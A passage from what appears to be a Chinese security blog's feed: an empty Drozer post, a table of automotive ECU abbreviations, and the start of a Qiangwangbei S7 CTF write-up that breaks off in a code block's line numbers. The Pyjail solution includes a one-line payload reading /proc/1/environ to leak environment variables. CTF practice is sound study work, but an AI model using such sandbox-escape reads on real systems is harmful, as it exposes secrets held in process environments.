href="https://www.jianshu.com/p/5459c653b34a">https://www.jianshu.com/p/5459c653b34a</a><br><a href="https://www.jianshu.com/p/ea8bc4aaf057">https://www.jianshu.com/p/ea8bc4aaf057</a><br><a href="https://www.jianshu.com/p/32938446e4e0">https://www.jianshu.com/p/32938446e4e0</a><br><a href="https://www.jianshu.com/p/ca3d87a4cdf3">https://www.jianshu.com/p/ca3d87a4cdf3</a><br><a href="https://www.jianshu.com/p/d963c55c3ab9">https://www.jianshu.com/p/d963c55c3ab9</a><br><a href="https://blog.csdn.net/qian1127/article/details/103531761">https://blog.csdn.net/qian1127/article/details/103531761</a><br><a href="https://www.cnblogs.com/Gandy/p/7290069.html">https://www.cnblogs.com/Gandy/p/7290069.html</a><br><a href="https://www.cnblogs.com/rebeyond/p/10916076.html">https://www.cnblogs.com/rebeyond/p/10916076.html</a><br><a href="https://blog.csdn.net/whnyao1314/article/details/83007498">https://blog.csdn.net/whnyao1314/article/details/83007498</a></p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Drozer指北</title>
    <link href="/2024/01/27/Drozer/"/>
    <url>/2024/01/27/Drozer/</url>
    
    <content type="html"><![CDATA[<p>正在装修中。。。</p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ECU</title>
    <link href="/2024/01/18/ECU/"/>
    <url>/2024/01/18/ECU/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E6%8E%A7%E5%88%B6%E5%99%A8">ECU</a>（Electronic Control Unit）是<a href="https://zh.wikipedia.org/wiki/%E6%B1%BD%E8%BB%8A%E9%9B%BB%E5%AD%90">汽车电子</a>系统中用来控制电气系统、电子系统及汽车子系统的<a href="https://zh.wikipedia.org/wiki/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F">嵌入式系统</a>。无论是看车辆架构图还是UDS诊断报文分析都离不开ECU，现如今电车高度智能化，ECU也多的让人眼花缭乱，吐血整理ECU缩写及其对应的释义，方便后期分析学习。</p><table><thead><tr><th align="center"><strong>缩写</strong></th><th align="center"><strong>英文</strong></th><th align="center"><strong>中文</strong></th></tr></thead><tbody><tr><td align="center"><strong>ACCM</strong></td><td align="center">Air compressor Control Module</td><td align="center">空调压缩机模块</td></tr><tr><td align="center"><strong>ACM</strong></td><td align="center">Alternator Control Module</td><td align="center">交流电机控制模块</td></tr><tr><td align="center"><strong>AFU</strong></td><td align="center">Air Fragance Unit</td><td align="center">空气芬香模块</td></tr><tr><td align="center"><strong>AGM</strong></td><td align="center">Active Grill Shutter Module</td><td align="center">主动格栅关闭模块</td></tr><tr><td align="center"><strong>AIU</strong></td><td align="center">Air Ionizer Unit</td><td align="center">空气负离子发生器</td></tr><tr><td align="center"><strong>ALM</strong></td><td align="center">Ambience Lights Module</td><td align="center">氛围灯</td></tr><tr><td align="center"><strong>APMS</strong></td><td align="center">Air Particulate Matter Sensor</td><td align="center">PM2.5</td></tr><tr><td align="center"><strong>ASDM</strong></td><td align="center">Active Safety Domain Master</td><td align="center">主动安全域控制器</td></tr><tr><td align="center"><strong>ASSM</strong></td><td align="center">Active Spoiler Shutter Module</td><td align="center">主动扰流模块</td></tr><tr><td align="center"><strong>ASWM</strong></td><td align="center">Adjustable Steering Wheel Module</td><td align="center">可调方向盘模块</td></tr><tr><td align="center"><strong>AUD</strong></td><td align="center">Audio Module</td><td align="center">音响模块</td></tr><tr><td align="center"><strong>BBM</strong></td><td align="center">Brake Booster Module</td><td align="center">制动助力器模块</td></tr><tr><td align="center"><strong>BBS</strong></td><td align="center">Battery Backed-up Sounder</td><td align="center">后备电池报警器</td></tr><tr><td align="center"><strong>BECM</strong></td><td align="center">Battery Energy Control Module</td><td align="center">电池管理系统</td></tr><tr><td align="center"><strong>BMS</strong></td><td align="center">Battery Monitoring Sensor</td><td align="center">蓄电池监测传感器</td></tr><tr><td align="center"><strong>CCM</strong></td><td align="center">Climate Control Module</td><td align="center">空调控制模块</td></tr><tr><td align="center"><strong>CCSM</strong></td><td align="center">Center Console Switch Module</td><td align="center">中控开关模块</td></tr><tr><td align="center"><strong>CEM</strong></td><td align="center">Central Electronic Module</td><td align="center">中央电控模块（车身控制模块）</td></tr><tr><td align="center"><strong>CFCM</strong></td><td align="center">Charger Flap Control Module</td><td align="center">充电口盖</td></tr><tr><td align="center"><strong>CMS</strong></td><td align="center">Camera Monitoring System</td><td align="center">流媒体监视系统</td></tr><tr><td align="center"><strong>CSD</strong></td><td align="center">Center Stack Display</td><td align="center">中控台显示屏</td></tr><tr><td align="center"><strong>CSDM</strong></td><td align="center">Console Switch Display Module</td><td align="center">中控触摸显示屏（副屏）</td></tr><tr><td align="center"><strong>DDM</strong></td><td align="center">Driver Door Module</td><td align="center">驾驶员车门模块</td></tr><tr><td align="center"><strong>DDS</strong></td><td align="center">Driver Door Switches</td><td align="center">驾驶员侧车门组合开关</td></tr><tr><td align="center"><strong>DEM</strong></td><td align="center">Differential Electronic Module</td><td align="center">电子差速器模块</td></tr><tr><td align="center"><strong>DIG</strong></td><td align="center">Driver intelligent change colour glass module</td><td align="center">驾驶侧智能变色玻璃模块</td></tr><tr><td align="center"><strong>DIM</strong></td><td align="center">Driver Information Module</td><td align="center">驾驶员信息模块</td></tr><tr><td align="center"><strong>DMM</strong></td><td align="center">Driver Monitor Module</td><td align="center">驾驶员状态监测模块</td></tr><tr><td align="center"><strong>DMSM</strong></td><td align="center">Drive Mode Switch Module</td><td align="center">驾驶模式开关模块</td></tr><tr><td align="center"><strong>DPOD</strong></td><td align="center">Driver Power Operated Door</td><td align="center">驾驶侧电动门控制模块</td></tr><tr><td align="center"><strong>DRM</strong></td><td align="center">Driver Radar module</td><td align="center">驾驶侧雷达模块</td></tr><tr><td align="center"><strong>DSRC</strong></td><td align="center">Dedicated Short Range Communication</td><td align="center">近程通讯模块</td></tr><tr><td align="center"><strong>DVR</strong></td><td align="center">Digital Video Record</td><td align="center">行车记录仪</td></tr><tr><td align="center"><strong>EAV</strong></td><td align="center">Electric exhaust Acoustic Valve</td><td align="center">排气电动调音阀</td></tr><tr><td align="center"><strong>ECM</strong></td><td align="center">Engine Control Module</td><td align="center">发动机控制模块</td></tr><tr><td align="center"><strong>ECPM</strong></td><td align="center">Engine Coolant Pump Module</td><td align="center">发动机冷却泵模块</td></tr><tr><td align="center"><strong>ECS</strong></td><td align="center">Electic Clutch System</td><td align="center">电子离合器</td></tr><tr><td align="center"><strong>EDCP</strong></td><td align="center">Electric Drivetrain Coolant Pump</td><td align="center">电控动力传动系统冷却泵</td></tr><tr><td align="center"><strong>EGSM</strong></td><td align="center">Electronic Gear Selector Module</td><td align="center">电子换档模块</td></tr><tr><td align="center"><strong>ESM</strong></td><td align="center">Exterior Sound Module</td><td align="center">外部发声模块</td></tr><tr><td align="center"><strong>FCSI</strong></td><td align="center">Fast Charger Socket Indicator</td><td align="center">快充指示</td></tr><tr><td align="center"><strong>FLC</strong></td><td align="center">Forward Looking Camera</td><td align="center">前视摄像头</td></tr><tr><td align="center"><strong>FLR</strong></td><td align="center">Forward Looking Radar</td><td align="center">前视雷达</td></tr><tr><td align="center"><strong>FMDM</strong></td><td align="center">Foot Movement Detection Module</td><td align="center">脚下移动侦测模块</td></tr><tr><td align="center"><strong>FPM</strong></td><td align="center">Finger Print Module</td><td align="center">指纹识别模块</td></tr><tr><td align="center"><strong>FSRL</strong></td><td align="center">Front Side Radar Left</td><td align="center">前左侧方雷达</td></tr><tr><td align="center"><strong>FSRR</strong></td><td align="center">Front Side Radar Right</td><td align="center">前右侧方雷达</td></tr><tr><td align="center"><strong>HBMF</strong></td><td align="center">HVAC Blower Module Front</td><td align="center">前空调鼓风机模块</td></tr><tr><td align="center"><strong>HCML</strong></td><td align="center">Head Lamp Control Module Left</td><td align="center">左前大灯控制模块</td></tr><tr><td align="center"><strong>HCMR</strong></td><td align="center">Head Lamp Control Module Right</td><td align="center">右前大灯控制模块</td></tr><tr><td align="center"><strong>HFAF</strong></td><td align="center">HVAC Flap Actuators Front</td><td align="center">风门电机</td></tr><tr><td align="center"><strong>HUD</strong></td><td align="center">Head Up Display</td><td align="center">抬头显示</td></tr><tr><td align="center"><strong>HVCH</strong></td><td align="center">High Voltage Coolant Heater</td><td align="center">高压冷却液加热器</td></tr><tr><td align="center"><strong>IEM</strong></td><td align="center">Inverter ERAD Module</td><td align="center">逆变式电动后桥驱动模块</td></tr><tr><td align="center"><strong>IGM</strong></td><td align="center">Inverter Generator Module</td><td align="center">变频发电机模块</td></tr><tr><td align="center"><strong>IHU</strong></td><td align="center">Infotainment Head Unit</td><td align="center">信息娱乐主机（音响主机）</td></tr><tr><td align="center"><strong>IMS</strong></td><td align="center">Interior Movement Sensor</td><td align="center">内部运动传感器</td></tr><tr><td align="center"><strong>IRMM</strong></td><td align="center">Interior Rear view Mirror Module</td><td align="center">内后视镜模块</td></tr><tr><td align="center"><strong>ISGM</strong></td><td align="center">Integrated start generator module</td><td align="center">智能发电机模块</td></tr><tr><td align="center"><strong>LPOD</strong></td><td align="center">left Rear Operated Door</td><td align="center">左后电动门控制模块</td></tr><tr><td align="center"><strong>MMD</strong></td><td align="center">Driver Massage Module</td><td align="center">驾驶侧按摩模块</td></tr><tr><td align="center"><strong>MML</strong></td><td align="center">Massage Module Left</td><td align="center">左后乘客侧按摩模块</td></tr><tr><td align="center"><strong>MMP</strong></td><td align="center">Passenger Massage Module</td><td align="center">副驾驶侧按摩模块</td></tr><tr><td align="center"><strong>MMR</strong></td><td align="center">Massage Module Right</td><td align="center">右后乘客侧按摩模块</td></tr><tr><td align="center"><strong>MVBM</strong></td><td align="center">Medium Voltage Battery Module</td><td align="center">中压电池管理</td></tr><tr><td align="center"><strong>MVCM</strong></td><td align="center">Middle voltage control module</td><td align="center">中压控制模块</td></tr><tr><td align="center"><strong>NVM</strong></td><td align="center">Night Vision Module</td><td align="center">夜视模块</td></tr><tr><td align="center"><strong>OBC</strong></td><td align="center">On Board Charger</td><td align="center">充电口（车载充电器)</td></tr><tr><td align="center"><strong>OHC</strong></td><td align="center">Overhead Console</td><td align="center">顶灯模块（带天窗控制开关）</td></tr><tr><td align="center"><strong>OWS</strong></td><td align="center">Occupant Weight Sensor</td><td align="center">成员检测传感器（座椅内部，用来检测是否坐人的传感器）</td></tr><tr><td align="center"><strong>PAC</strong></td><td align="center">Park Assist Camera</td><td align="center">驻车辅助摄像头</td></tr><tr><td align="center"><strong>PAS</strong></td><td align="center">Parking Assist System</td><td align="center">驻车辅助系统</td></tr><tr><td align="center"><strong>PDM</strong></td><td align="center">Passenger Door Module</td><td align="center">副驾驶门模块</td></tr><tr><td align="center"><strong>PIG</strong></td><td align="center">Passenger intelligent change colour glass module</td><td align="center">副驾驶侧智能变色玻璃模块</td></tr><tr><td align="center"><strong>POT</strong></td><td align="center">Power Operated Tailgate</td><td align="center">电动后背门</td></tr><tr><td align="center"><strong>PPOD</strong></td><td align="center">Passenger Power Operated Door</td><td align="center">乘客侧电动门控制模块</td></tr><tr><td align="center"><strong>PRM</strong></td><td align="center">Passenger Radar module</td><td align="center">副驾驶侧雷达模块</td></tr><tr><td align="center"><strong>PSCM</strong></td><td align="center">Power Steering Control Module</td><td align="center">电动助力转向模块</td></tr><tr><td align="center"><strong>RCML</strong></td><td align="center">Rear Lamp Control Module Left</td><td align="center">左尾灯控制模块</td></tr><tr><td align="center"><strong>RCMR</strong></td><td align="center">Rear Lamp Control Module Right</td><td align="center">右尾灯控制模块</td></tr><tr><td align="center"><strong>RCSM</strong></td><td align="center">Rear Console Switch Module</td><td align="center">后开关控制模块</td></tr><tr><td align="center"><strong>RDDM</strong></td><td align="center">Rear Driver Door Module</td><td align="center">后驾驶侧门模块</td></tr><tr><td align="center"><strong>RDIG</strong></td><td align="center">Rear Driver intelligent change colour glass module</td><td align="center">左后乘客侧智能变色玻璃模块</td></tr><tr><td align="center"><strong>RDRM</strong></td><td align="center">Rear Driver Radar module</td><td align="center">驾驶侧后雷达模块</td></tr><tr><td align="center"><strong>RLSM</strong></td><td align="center">Rain and Light Sensor Module</td><td align="center">阳光雨量传感器</td></tr><tr><td align="center"><strong>RMD</strong></td><td align="center">Rear View Mirror Display</td><td align="center">内后视镜显示</td></tr><tr><td align="center"><strong>RML</strong></td><td align="center">Restraint Module Left</td><td align="center">左约束模块（气囊安全带控制模块）</td></tr><tr><td align="center"><strong>RMR</strong></td><td align="center">Restraint Module Right</td><td align="center">右约束模块（气囊安全带控制模块）</td></tr><tr><td align="center"><strong>RPDM</strong></td><td align="center">Rear Passenger Door Module</td><td align="center">后排乘客门模块</td></tr><tr><td align="center"><strong>RPIG</strong></td><td align="center">Rear Passenger intelligent change colour glass module</td><td align="center">右后乘客侧智能变色玻璃模块</td></tr><tr><td align="center"><strong>RPOD</strong></td><td align="center">Right Rear Operated Door</td><td align="center">右后电动门控制模块</td></tr><tr><td align="center"><strong>RPRM</strong></td><td align="center">Rear Passenger Radar module</td><td align="center">副驾驶侧后雷达模块</td></tr><tr><td align="center"><strong>SAS</strong></td><td align="center">Steering Angle Sensor</td><td align="center">转向角传感器</td></tr><tr><td align="center"><strong>SCL</strong></td><td align="center">Steering Column Lock</td><td align="center">转向柱锁</td></tr><tr><td align="center"><strong>SCM</strong></td><td align="center">Sun Curtain Module</td><td align="center">遮阳帘模块</td></tr><tr><td align="center"><strong>SCSI</strong></td><td align="center">Slow Charger Socket Indicator</td><td align="center">慢充指示</td></tr><tr><td align="center"><strong>SGT</strong></td><td align="center">Skylight glass top</td><td align="center">天窗玻璃星空顶</td></tr><tr><td align="center"><strong>SHD</strong></td><td align="center">Driver Seat Heating</td><td align="center">座椅通风</td></tr><tr><td align="center"><strong>SHR</strong></td><td align="center">Seat Heat Rear Module</td><td align="center">后座椅加热模块</td></tr><tr><td align="center"><strong>SIG</strong></td><td align="center">Sunroof intelligent change colour glass module</td><td align="center">智能天窗玻璃变色模块</td></tr><tr><td align="center"><strong>SMD</strong></td><td align="center">Driver Seat Module</td><td align="center">驾驶侧座椅模块</td></tr><tr><td align="center"><strong>SMP</strong></td><td align="center">Passenger Seat Module</td><td align="center">乘客侧座椅模块</td></tr><tr><td align="center"><strong>SMR</strong></td><td align="center">Seat Module Rear</td><td align="center">后座椅模块</td></tr><tr><td align="center"><strong>SODL</strong></td><td align="center">Side Obstacle Detection Left</td><td align="center">左侧障碍侦测</td></tr><tr><td align="center"><strong>SODR</strong></td><td align="center">Side Obstacle Detection Right</td><td align="center">右侧障碍侦测</td></tr><tr><td align="center"><strong>SRM</strong></td><td align="center">Sun Roof Module</td><td align="center">天窗模块</td></tr><tr><td align="center"><strong>SRS</strong></td><td align="center">Supplementary Restraint System</td><td align="center">约束系统—安全气囊</td></tr><tr><td align="center"><strong>SUM</strong></td><td align="center">Suspension Module</td><td align="center">悬架模块</td></tr><tr><td align="center"><strong>SWM</strong></td><td align="center">Steering Wheel Module</td><td align="center">组合开关模块</td></tr><tr><td align="center"><strong>SWSM</strong></td><td align="center">Steering Wheel Switch Module</td><td align="center">转向盘开关模块</td></tr><tr><td align="center"><strong>TACM</strong></td><td align="center">Transmission Actuator Control Module</td><td align="center">变速箱执行器控制模块</td></tr><tr><td align="center"><strong>TCAM</strong></td><td align="center">Telematics &amp; Connectivity Antenna Module</td><td align="center">车载信息系统连接天线模块</td></tr><tr><td align="center"><strong>TCH</strong></td><td align="center">Thermal Cup Holder</td><td align="center">冷热杯托</td></tr><tr><td align="center"><strong>TCM</strong></td><td align="center">Transmission Control Module</td><td align="center">变速器控制模块</td></tr><tr><td align="center"><strong>TPM</strong></td><td align="center">Touch Panel Module</td><td align="center">触控手写板</td></tr><tr><td align="center"><strong>TRM</strong></td><td align="center">Trailer Module</td><td align="center">拖车模块</td></tr><tr><td align="center"><strong>VBMR</strong></td><td align="center">VAC Blower Module Rear</td><td align="center">后空调鼓风机模块</td></tr><tr><td align="center"><strong>VDDM</strong></td><td align="center">Vehicle Dynamics Domain Master</td><td align="center">动力域主节点（FLEXRAY的主干网的节点，也有ESP功能）</td></tr><tr><td align="center"><strong>VGM</strong></td><td align="center">Vehicle Gateway Module</td><td align="center">车辆网关模块</td></tr><tr><td align="center"><strong>VMPS</strong></td><td align="center">Vehicle Motion Position system</td><td align="center">车辆移动定位系统</td></tr><tr><td align="center"><strong>VRM</strong></td><td align="center">Vehicle Refrigerator Module</td><td align="center">车载冰箱</td></tr><tr><td align="center"><strong>WMM</strong></td><td align="center">Wiper Motor Module</td><td align="center">电动雨刮</td></tr><tr><td align="center"><strong>WPC</strong></td><td align="center">Wireless Power Charge</td><td align="center">手机无线充电</td></tr><tr><td align="center"><strong>NFC</strong></td><td align="center">Near Field Communication</td><td align="center">近场通信</td></tr><tr><td align="center"><strong>WPT</strong></td><td align="center">Wireless Power Transfer</td><td align="center">无线充电模块</td></tr><tr><td align="center"><strong>VGA</strong></td><td align="center">Vent Grill Actuator</td><td align="center">空调出风口</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>IoV</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯S7</title>
    <link href="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023/"/>
    <url>/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023/</url>
    
    <content type="html"><![CDATA[<p>我他妈怎么这么菜啊！我他妈怎么这么菜啊！我他妈怎么这么菜啊！</p><p><img src="https://p.sda1.dev/14/aaaa6e10bdcb2dd1b69a51fb708b0749/37E4CF6E2C3F9A4F10F1BFF6985BCFAC.gif"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Pyjail-It’s-myFILTER"><a href="#Pyjail-It’s-myFILTER" class="headerlink" title="Pyjail ! It’s myFILTER !!!"></a>Pyjail ! It’s myFILTER !!!</h3><p>又又又非预期嘞，参考今年CISCN初赛的可信度量，直接读取环境变量，使用Python的<code>open().read()</code>来读取<code>/proc/1/environ</code>文件的内容<br><code>&#123;print(open(&quot;/proc/1/environ&quot;).read())&#125;</code></p><h3 id="Happy-Chess"><a href="#Happy-Chess" class="headerlink" title="Happy Chess"></a>Happy Chess</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Welcome <span class="hljs-built_in">to</span> Happy Chess!<br>The rule is <span class="hljs-built_in">to</span> select <span class="hljs-keyword">a</span> piece <span class="hljs-keyword">and</span> flip all <span class="hljs-keyword">the</span> pieces horizontally <span class="hljs-keyword">and</span> vertically ~<br>Your goal is <span class="hljs-built_in">to</span> change all <span class="hljs-keyword">the</span> pieces <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> same color ~<br>You will play <span class="hljs-number">10</span> rounds <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> game, <span class="hljs-keyword">and</span> you can <span class="hljs-built_in">get</span> <span class="hljs-keyword">the</span> flag <span class="hljs-keyword">if</span> your total <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> moves is no more than <span class="hljs-number">239</span> ~<br>If you fail <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">round</span>, <span class="hljs-keyword">it</span> will be directly regarded <span class="hljs-keyword">as</span> <span class="hljs-keyword">using</span> <span class="hljs-number">240</span> steps :)<br>Have fun ~<br></code></pre></td></tr></table></figure><p>Sample input: [x] [y]，按照坐标移动，发现移动坐标一致时，棋盘会循环出现（和石头剪刀布那个逻辑很像），如此手搓十局之后，竟然就拿到了flag，很奇怪）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span 